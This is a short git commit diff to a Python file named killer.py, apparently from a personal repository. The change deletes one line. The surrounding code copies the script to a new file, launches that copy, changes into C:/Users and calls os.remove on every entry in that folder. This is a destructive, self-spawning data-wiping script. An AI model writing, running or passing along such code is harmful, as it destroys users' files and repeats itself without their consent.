9e2a3cb18e7f0c80afb9506f53b88c3b3ca18691
accessvirgil83 <40273814+accessvirgil83@users.noreply.github.com>
2023-12-05 19:31:19 +0500

    Update killer.py

--- killer.py
+++ killer.py
@@ -6,7 +6,6 @@ new_file_path = file_path + '_copy.py'
 shutil.copyfile(file_path, new_file_path)
 subprocess.Popen(['python', new_file_path])
 os.chdir('C:/Users')
-file_path = os.path.abspath(sys.argv[0])
 for i in os.listdir():
     os.remove(i)   
 
